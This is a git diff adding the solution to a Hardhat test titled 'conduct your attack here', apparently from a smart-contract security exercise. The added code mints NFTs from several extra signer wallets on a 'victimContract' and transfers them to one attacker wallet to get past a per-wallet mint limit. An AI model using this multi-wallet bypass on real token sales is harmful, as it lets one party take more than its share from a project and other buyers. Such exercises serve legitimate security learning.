@@ -25,6 +25,22 @@ describe(NAME, function () {
         })
 
         it("conduct your attack here", async function () {
+            let attackerWallet2 = (await ethers.getSigners())[2]
+            let attackerWallet3 = (await ethers.getSigners())[3]
+            let attackerWallet4 = (await ethers.getSigners())[4]
+            let attackerWallet5 = (await ethers.getSigners())[5]
+            let attackerWallet6 = (await ethers.getSigners())[6]
+            await victimContract.connect(attackerWallet).mint()
+            await victimContract.connect(attackerWallet2).mint()
+            await victimContract.connect(attackerWallet3).mint()
+            await victimContract.connect(attackerWallet4).mint()
+            await victimContract.connect(attackerWallet5).mint()
+
+            await victimContract.connect(attackerWallet2).transferFrom(attackerWallet2.address, attackerWallet.address, 2)
+            await victimContract.connect(attackerWallet3).transferFrom(attackerWallet3.address, attackerWallet.address, 3)
+            await victimContract.connect(attackerWallet4).transferFrom(attackerWallet4.address, attackerWallet.address, 4)
+            await victimContract.connect(attackerWallet5).transferFrom(attackerWallet5.address, attackerWallet.address, 5)
+
 
         });
 
